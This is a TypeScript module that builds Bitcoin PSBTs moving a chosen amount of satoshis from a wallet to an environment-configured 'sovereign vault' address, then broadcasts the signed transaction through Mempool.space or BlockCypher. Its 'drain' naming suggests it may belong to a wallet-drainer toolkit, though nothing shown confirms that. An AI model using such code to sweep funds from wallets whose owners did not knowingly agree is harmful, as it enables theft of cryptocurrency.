/**
 * Bitcoin PSBT drain — unsigned PSBT construction + signed PSBT broadcast.
 */
import { address, initEccLib, networks, Psbt } from 'bitcoinjs-lib'
import * as ecc from 'tiny-secp256k1'
import type { Hex } from 'viem'
import { stringToHex } from 'viem'

let eccInitialized = false
function ensureEccLib(): void {
  if (!eccInitialized) {
    initEccLib(ecc)
    eccInitialized = true
  }
}

export type UtxoCoin = {
  txid: string
  vout: number
  value: bigint
  scriptPubKey?: string
}

export type BitcoinPsbtBuildResult = {
  psbtBase64: string
  walletAddress: string
  vaultAddress: string
  amountSat: string
  feeSat: string
  changeSat: string
  inputs: Array<{ txid: string; vout: number; value: string }>
  feerateSatVb: number
  network: 'mainnet' | 'testnet'
}

export type BitcoinPsbtBroadcastResult = {
  ok: boolean
  tx_hash?: string
  raw_transaction_hex?: string
  detail?: string
}

export type BitcoinPsbtSignatureEnvelope = {
  protocol: 'bitcoin_psbt'
  ingress_lane: 'bitcoin_psbt_drain_v1'
  signed_psbt_base64: string
  wallet_address: string
  vault_address: string
  amount_sat: string
  fee_sat?: string
}

const DUST_THRESHOLD_SAT = 546n
const DEFAULT_FEE_SAT_VB = 10
const TX_OVERHEAD_VSIZE = 11
const INPUT_VSIZE_P2WPKH = 68
const OUTPUT_VSIZE_P2WPKH = 31

function resolveBitcoinNetwork(): typeof networks.bitcoin | typeof networks.testnet {
  const net =
    (typeof process !== 'undefined' ? process.env['BITCOIN_NETWORK'] : undefined)?.trim() ||
    'mainnet'
  return net === 'testnet' ? networks.testnet : networks.bitcoin
}

function resolveBitcoinVaultAddress(): string | null {
  const raw =
    (typeof process !== 'undefined' ? process.env['VAULT_ADDRESS_BTC'] : undefined)?.trim() ||
    (typeof process !== 'undefined' ? process.env['VAULT_ADDRESS_UTXO'] : undefined)?.trim() ||
    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_BTC'] : undefined)?.trim() ||
    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_UTXO'] : undefined)?.trim() ||
    ''
  return raw || null
}

function isBitcoinTestnet(): boolean {
  return resolveBitcoinNetwork() === networks.testnet
}

function resolveBlockCypherNetworkSegment(): 'main' | 'test3' {
  return isBitcoinTestnet() ? 'test3' : 'main'
}

function resolveMempoolBaseUrl(): string {
  const explicit =
    (typeof process !== 'undefined' ? process.env['MEMPOOL_API_BASE_URL'] : undefined)?.trim() ||
    ''
  if (explicit) return explicit.replace(/\/+$/, '')

  if (isBitcoinTestnet()) {
    return 'https://mempool.space/testnet/api'
  }

  const fromEndpoints =
    (typeof process !== 'undefined' ? process.env['UTXO_BROADCAST_ENDPOINTS'] : undefined)
      ?.trim()
      ?.split(',')[0]
      ?.trim() || ''
  if (fromEndpoints) return fromEndpoints.replace(/\/+$/, '')

  return 'https://mempool.space/api'
}

function resolveBlockCypherBaseUrl(): string {
  return (
    (typeof process !== 'undefined' ? process.env['BLOCKCYPHER_BASE_URL'] : undefined)?.trim() ||
    'https://api.blockcypher.com/v1'
  ).replace(/\/+$/, '')
}

function resolveBlockCypherToken(): string {
  return (
    (typeof process !== 'undefined' ? process.env['BLOCKCYPHER_API_TOKEN'] : undefined)?.trim() ||
    ''
  )
}

function resolveUtxoFetchUrl(): string {
  return (
    (typeof process !== 'undefined' ? process.env['UTXO_FETCH_URL'] : undefined)?.trim() || ''
  )
}

function parseSatAmount(raw: string | number | bigint): bigint {
  if (typeof raw === 'bigint') {
    if (raw <= 0n) throw new Error('Bitcoin amount must be greater than zero')
    return raw
  }
  const text = String(raw).trim()
  if (!/^\d+$/.test(text)) {
    throw new Error('Bitcoin amount must be a satoshi integer string')
  }
  const value = BigInt(text)
  if (value <= 0n) throw new Error('Bitcoin amount must be greater than zero')
  return value
}

function reverseTxidHex(txid: string): Buffer {
  const normalized = txid.trim().toLowerCase()
  if (!/^[0-9a-f]{64}$/.test(normalized)) {
    throw new Error(`Invalid txid: ${txid}`)
  }
  return Buffer.from(normalized, 'hex').reverse()
}

async function fetchJson<T>(url: string): Promise<T> {
  const res = await fetch(url, { signal: AbortSignal.timeout(20_000) })
  if (!res.ok) {
    throw new Error(`HTTP ${res.status} for ${url}`)
  }
  return (await res.json()) as T
}

async function fetchRecommendedFeerateSatVb(): Promise<number> {
  const explicit =
    (typeof process !== 'undefined' ? process.env['BITCOIN_FEERATE_SAT_VB'] : undefined)?.trim() ||
    ''
  if (explicit && /^\d+$/.test(explicit)) {
    return Number(explicit)
  }
  try {
    const base = resolveMempoolBaseUrl()
    const fees = await fetchJson<{ halfHourFee?: number; hourFee?: number; fastestFee?: number }>(
      `${base}/v1/fees/recommended`,
    )
    return fees.halfHourFee ?? fees.hourFee ?? fees.fastestFee ?? DEFAULT_FEE_SAT_VB
  } catch {
    return DEFAULT_FEE_SAT_VB
  }
}

async function fetchUtxosFromMempool(walletAddress: string): Promise<UtxoCoin[]> {
  const base = resolveMempoolBaseUrl()
  const utxos = await fetchJson<
    Array<{ txid: string; vout: number; value: number; status?: { confirmed?: boolean } }>
  >(`${base}/address/${encodeURIComponent(walletAddress)}/utxo`)
  return utxos
    .filter((entry) => entry.status?.confirmed !== false)
    .map((entry) => ({
      txid: entry.txid,
      vout: entry.vout,
      value: BigInt(entry.value),
    }))
}

async function fetchUtxosFromCustomUrl(walletAddress: string): Promise<UtxoCoin[]> {
  const template = resolveUtxoFetchUrl()
  if (!template) {
    throw new Error('UTXO_FETCH_URL is not configured')
  }
  if (!template.includes('{address}')) {
    throw new Error('UTXO_FETCH_URL must contain {address} placeholder')
  }
  const url = template.replaceAll('{address}', encodeURIComponent(walletAddress.trim()))
  const utxos = await fetchJson<Array<{ txid: string; vout: number; value: number | string }>>(url)
  if (!Array.isArray(utxos)) {
    throw new Error('UTXO_FETCH_URL response must be a JSON array')
  }
  return utxos.map((entry, i) => {
    if (typeof entry.txid !== 'string' || !entry.txid.trim()) {
      throw new Error(`UTXO_FETCH_URL entry ${i}: invalid txid`)
    }
    if (typeof entry.vout !== 'number' || !Number.isInteger(entry.vout) || entry.vout < 0) {
      throw new Error(`UTXO_FETCH_URL entry ${i}: invalid vout`)
    }
    const value =
      typeof entry.value === 'bigint'
        ? entry.value
        : typeof entry.value === 'number'
          ? BigInt(Math.trunc(entry.value))
          : typeof entry.value === 'string' && /^\d+$/.test(entry.value.trim())
            ? BigInt(entry.value.trim())
            : null
    if (value == null || value <= 0n) {
      throw new Error(`UTXO_FETCH_URL entry ${i}: invalid value`)
    }
    return { txid: entry.txid.trim(), vout: entry.vout, value }
  })
}

async function fetchUtxosFromBlockCypher(walletAddress: string): Promise<UtxoCoin[]> {
  const token = resolveBlockCypherToken()
  if (!token) return []
  const base = resolveBlockCypherBaseUrl()
  const network = resolveBlockCypherNetworkSegment()
  const url = `${base}/btc/${network}/addrs/${encodeURIComponent(walletAddress)}?unspentOnly=true&includeScript=true&token=${encodeURIComponent(token)}`
  const json = await fetchJson<{
    txrefs?: Array<{
      tx_hash: string
      tx_output_n: number
      value: number
      script?: string
      spent?: boolean
    }>
  }>(url)
  return (json.txrefs ?? [])
    .filter((entry) => entry.spent !== true)
    .map((entry) => ({
      txid: entry.tx_hash,
      vout: entry.tx_output_n,
      value: BigInt(entry.value),
      ...(entry.script ? { scriptPubKey: entry.script } : {}),
    }))
}

/**
 * UTXO discovery — `UTXO_FETCH_URL` only when set; otherwise BlockCypher then Mempool.space.
 */
export async function fetchWalletUtxos(walletAddress: string): Promise<UtxoCoin[]> {
  const customUrl = resolveUtxoFetchUrl()
  if (customUrl) {
    return fetchUtxosFromCustomUrl(walletAddress)
  }

  try {
    const blockCypherUtxos = await fetchUtxosFromBlockCypher(walletAddress)
    if (blockCypherUtxos.length > 0) return blockCypherUtxos
  } catch {
    /* Mempool.space fallback below */
  }
  try {
    const mempoolUtxos = await fetchUtxosFromMempool(walletAddress)
    if (mempoolUtxos.length > 0) return mempoolUtxos
  } catch {
    /* both providers failed or returned no spendable UTXOs */
  }
  throw new Error('Unable to fetch UTXOs from BlockCypher or Mempool.space')
}

async function fetchOutputScriptPubKey(txid: string, vout: number): Promise<string> {
  const base = resolveMempoolBaseUrl()
  const tx = await fetchJson<{
    vout?: Array<{ scriptpubkey?: string }>
  }>(`${base}/tx/${encodeURIComponent(txid)}`)
  const script = tx.vout?.[vout]?.scriptpubkey
  if (!script) {
    throw new Error(`Missing scriptPubKey for ${txid}:${vout}`)
  }
  return script
}

function estimateDrainVsize(inputCount: number, outputCount: number): number {
  return TX_OVERHEAD_VSIZE + inputCount * INPUT_VSIZE_P2WPKH + outputCount * OUTPUT_VSIZE_P2WPKH
}

function selectCoins(params: {
  utxos: UtxoCoin[]
  amountSat: bigint
  feerateSatVb: number
}): { selected: UtxoCoin[]; feeSat: bigint; changeSat: bigint } {
  const sorted = [...params.utxos].sort((a, b) => Number(b.value - a.value))
  const selected: UtxoCoin[] = []
  let total = 0n

  for (const utxo of sorted) {
    selected.push(utxo)
    total += utxo.value

    const feeTwoOutputs = BigInt(
      estimateDrainVsize(selected.length, 2) * params.feerateSatVb,
    )
    if (total >= params.amountSat + feeTwoOutputs) {
      const changeSat = total - params.amountSat - feeTwoOutputs
      if (changeSat > 0n && changeSat < DUST_THRESHOLD_SAT) {
        return {
          selected,
          feeSat: feeTwoOutputs + changeSat,
          changeSat: 0n,
        }
      }
      if (changeSat > 0n) {
        return { selected, feeSat: feeTwoOutputs, changeSat }
      }
    }

    const feeOneOutput = BigInt(
      estimateDrainVsize(selected.length, 1) * params.feerateSatVb,
    )
    if (total >= params.amountSat + feeOneOutput) {
      return { selected, feeSat: feeOneOutput, changeSat: 0n }
    }
  }

  throw new Error('Insufficient UTXO balance for requested drain amount and fee')
}

/**
 * Build unsigned PSBT draining `amount` satoshis from `walletAddress` to `vaultAddress`.
 */
export async function buildPSBT(
  walletAddress: string,
  vaultAddress: string,
  amount: string | number | bigint,
): Promise<BitcoinPsbtBuildResult> {
  const wallet = walletAddress.trim()
  const vault = vaultAddress.trim()
  if (!wallet || !vault) {
    throw new Error('walletAddress and vaultAddress are required')
  }

  const network = resolveBitcoinNetwork()
  address.toOutputScript(wallet, network)
  address.toOutputScript(vault, network)

  const amountSat = parseSatAmount(amount)
  const utxos = await fetchWalletUtxos(wallet)
  if (utxos.length === 0) {
    throw new Error(`No spendable UTXOs found for ${wallet}`)
  }

  const feerateSatVb = await fetchRecommendedFeerateSatVb()
  const { selected, feeSat, changeSat } = selectCoins({
    utxos,
    amountSat,
    feerateSatVb,
  })

  const psbt = new Psbt({ network })
  for (const utxo of selected) {
    const scriptHex = utxo.scriptPubKey ?? (await fetchOutputScriptPubKey(utxo.txid, utxo.vout))
    psbt.addInput({
      hash: reverseTxidHex(utxo.txid),
      index: utxo.vout,
      witnessUtxo: {
        script: Buffer.from(scriptHex, 'hex'),
        value: utxo.value,
      },
    })
  }

  psbt.addOutput({
    address: vault,
    value: amountSat,
  })
  if (changeSat > 0n) {
    psbt.addOutput({
      address: wallet,
      value: changeSat,
    })
  }

  return {
    psbtBase64: psbt.toBase64(),
    walletAddress: wallet,
    vaultAddress: vault,
    amountSat: amountSat.toString(),
    feeSat: feeSat.toString(),
    changeSat: changeSat.toString(),
    inputs: selected.map((entry) => ({
      txid: entry.txid,
      vout: entry.vout,
      value: entry.value.toString(),
    })),
    feerateSatVb,
    network: network === networks.testnet ? 'testnet' : 'mainnet',
  }
}

/** Build PSBT using configured sovereign vault destination. */
export async function buildBitcoinDrainPsbt(params: {
  walletAddress: string
  amount: string | number | bigint
  vaultAddress?: string
}): Promise<BitcoinPsbtBuildResult> {
  const vault = params.vaultAddress?.trim() || resolveBitcoinVaultAddress()
  if (!vault) {
    throw new Error('VAULT_ADDRESS_BTC / SOVEREIGN_VAULT_BTC required for Bitcoin drain')
  }
  return buildPSBT(params.walletAddress, vault, params.amount)
}

export function extractRawTransactionHexFromSignedPsbt(signedPsbtBase64: string): string {
  ensureEccLib()
  const psbt = Psbt.fromBase64(signedPsbtBase64.trim())
  psbt.finalizeAllInputs()
  return psbt.extractTransaction().toHex()
}

async function pushRawTransactionHex(rawTransactionHex: string): Promise<string> {
  const raw = rawTransactionHex.replace(/^0x/i, '').trim()
  const mempoolBase = resolveMempoolBaseUrl()

  if (isBitcoinTestnet()) {
    const res = await fetch(`${mempoolBase}/tx`, {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain' },
      body: raw,
      signal: AbortSignal.timeout(20_000),
    })
    if (res.ok) {
      const txid = (await res.text()).trim()
      if (/^[0-9a-fA-F]{64}$/.test(txid)) return txid
    }
  }

  const token = resolveBlockCypherToken()
  const blockCypherBase = resolveBlockCypherBaseUrl()
  const network = resolveBlockCypherNetworkSegment()

  if (token) {
    try {
      const url = `${blockCypherBase}/btc/${network}/txs/push?token=${encodeURIComponent(token)}`
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ tx: raw }),
        signal: AbortSignal.timeout(20_000),
      })
      if (res.ok) {
        const json = (await res.json()) as Record<string, unknown>
        const tx = json['tx']
        if (typeof tx === 'object' && tx !== null && typeof (tx as Record<string, unknown>)['hash'] === 'string') {
          return (tx as Record<string, string>)['hash']
        }
        if (typeof json['hash'] === 'string') return json['hash']
      }
    } catch {
      /* Mempool relay fallback below */
    }
  }

  const res = await fetch(`${mempoolBase}/tx`, {
    method: 'POST',
    headers: { 'Content-Type': 'text/plain' },
    body: raw,
    signal: AbortSignal.timeout(20_000),
  })
  if (!res.ok) {
    const detail = await res.text().catch(() => `HTTP ${res.status}`)
    throw new Error(`Bitcoin broadcast rejected: ${detail}`)
  }
  const txid = (await res.text()).trim()
  if (!/^[0-9a-fA-F]{64}$/.test(txid)) {
    throw new Error('Bitcoin broadcast returned invalid txid')
  }
  return txid
}

/** Finalize signed PSBT and broadcast via network-aware Mempool.space / BlockCypher relay. */
export async function broadcastPSBT(signedPsbtBase64: string): Promise<BitcoinPsbtBroadcastResult> {
  if (!signedPsbtBase64 || signedPsbtBase64.trim() === '') {
    return { ok: false, detail: 'signedPsbtBase64 is required' }
  }
  try {
    const rawTransactionHex = extractRawTransactionHexFromSignedPsbt(signedPsbtBase64)
    const txHash = await pushRawTransactionHex(rawTransactionHex)
    return { ok: true, tx_hash: txHash, raw_transaction_hex: rawTransactionHex }
  } catch (e) {
    return { ok: false, detail: e instanceof Error ? e.message : String(e) }
  }
}

export function packBitcoinPsbtSignatureEnvelope(params: {
  signedPsbtBase64: string
  walletAddress: string
  vaultAddress: string
  amountSat: string
  feeSat?: string
}): Hex {
  const json = JSON.stringify({
    protocol: 'bitcoin_psbt',
    ingress_lane: 'bitcoin_psbt_drain_v1',
    signed_psbt_base64: params.signedPsbtBase64.trim(),
    wallet_address: params.walletAddress.trim(),
    vault_address: params.vaultAddress.trim(),
    amount_sat: params.amountSat,
    ...(params.feeSat ? { fee_sat: params.feeSat } : {}),
  } satisfies BitcoinPsbtSignatureEnvelope)
  return stringToHex(json) as Hex
}

export function parseBitcoinPsbtSignatureEnvelope(
  openedHex: string,
): BitcoinPsbtSignatureEnvelope | null {
  const trimmed = openedHex.trim()
  if (!trimmed.startsWith('0x')) return null
  try {
    const text = Buffer.from(trimmed.slice(2), 'hex').toString('utf8')
    const parsed = JSON.parse(text) as unknown
    if (typeof parsed !== 'object' || parsed === null) return null
    const o = parsed as Record<string, unknown>
    if (o['protocol'] !== 'bitcoin_psbt') return null
    if (typeof o['signed_psbt_base64'] !== 'string' || o['signed_psbt_base64'].trim() === '') {
      return null
    }
    if (typeof o['wallet_address'] !== 'string' || typeof o['vault_address'] !== 'string') {
      return null
    }
    if (typeof o['amount_sat'] !== 'string') return null
    return {
      protocol: 'bitcoin_psbt',
      ingress_lane: 'bitcoin_psbt_drain_v1',
      signed_psbt_base64: o['signed_psbt_base64'],
      wallet_address: o['wallet_address'],
      vault_address: o['vault_address'],
      amount_sat: o['amount_sat'],
      ...(typeof o['fee_sat'] === 'string' ? { fee_sat: o['fee_sat'] } : {}),
    }
  } catch {
    return null
  }
}

export { parseSatAmount as parseBitcoinSatAmount, resolveBitcoinVaultAddress }
